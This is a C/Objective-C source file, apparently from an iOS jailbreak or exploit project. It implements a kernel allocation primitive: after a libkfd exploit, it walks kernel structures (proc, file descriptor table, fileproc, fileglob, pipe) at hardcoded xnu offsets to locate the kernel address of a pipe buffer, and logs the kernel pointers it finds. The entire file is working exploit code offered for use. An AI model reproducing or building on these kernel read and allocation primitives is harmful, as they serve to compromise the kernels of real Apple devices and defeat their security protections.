// kallocation.m - C port of kallocation.swift (pipe-based kernel allocation)
// Original by Jonah Butler, ported from Swift to ObjC/C

#import <Foundation/Foundation.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <os/log.h>
#include "libkfd.h"

#define MAX_KALLOC_PIPES 64

static struct {
  uint64_t kaddr;
  int fds[2];
} g_kalloc_pipes[MAX_KALLOC_PIPES];
static int g_kalloc_pipe_count = 0;

uint64_t dg_kalloc(size_t size) {
  if (g_kalloc_pipe_count >= MAX_KALLOC_PIPES) return 0;

  int fds[2] = {0, 0};
  if (pipe(fds) == -1) return 0;

  uint8_t *buf = calloc(1, size);
  write(fds[1], buf, size);
  free(buf);

  // Walk kernel structures: proc → fd → fileproc → fileglob → pipe → buffer
  uint64_t cur_proc = get_current_proc();
  uint64_t proc_fd_ofiles = kread64_ptr_kfd(cur_proc + 0xf8);
  uint64_t fproc = kread64_ptr_kfd(proc_fd_ofiles + (uint64_t)(fds[0] * 8));
  uint64_t fglob = kread64_ptr_kfd(fproc + 0x10);
  uint64_t rawpipe = kread64_ptr_kfd(fglob + 0x38);

  // struct pipebuf layout on arm64 (xnu-8792):
  //   offset  0: u_int    cnt     (4B)  — bytes in buffer
  //   offset  4: u_int    in      (4B)  — write position
  //   offset  8: u_int    out     (4B)  — read position
  //   offset 12: u_int    size    (4B)  — buffer size
  //   offset 16: caddr_t  buffer  (8B)  — kernel VA of buffer (PAC-signed on arm64e)
  uint64_t pipeBuf = kread64_ptr_kfd(rawpipe + 16);

  os_log_error(OS_LOG_DEFAULT, "[kfd-kalloc] proc=0x%llx fd_ofiles=0x%llx fproc=0x%llx fglob=0x%llx pipe=0x%llx buf=0x%llx",
         cur_proc, proc_fd_ofiles, fproc, fglob, rawpipe, pipeBuf);

  if (!pipeBuf || pipeBuf < 0xffffff8000000000ULL) {
    os_log_error(OS_LOG_DEFAULT, "[kfd-kalloc] ERROR: invalid buffer pointer 0x%llx", pipeBuf);
    close(fds[0]);
    close(fds[1]);
    return 0;
  }

  g_kalloc_pipes[g_kalloc_pipe_count].kaddr = pipeBuf;
  g_kalloc_pipes[g_kalloc_pipe_count].fds[0] = fds[0];
  g_kalloc_pipes[g_kalloc_pipe_count].fds[1] = fds[1];
  g_kalloc_pipe_count++;

  return pipeBuf;
}

void dg_kfree(uint64_t kaddr) {
  for (int i = 0; i < g_kalloc_pipe_count; i++) {
    if (g_kalloc_pipes[i].kaddr == kaddr) {
      close(g_kalloc_pipes[i].fds[0]);
      close(g_kalloc_pipes[i].fds[1]);
      // Shift remaining entries
      for (int j = i; j < g_kalloc_pipe_count - 1; j++) {
        g_kalloc_pipes[j] = g_kalloc_pipes[j + 1];
      }
      g_kalloc_pipe_count--;
      break;
    }
  }
}
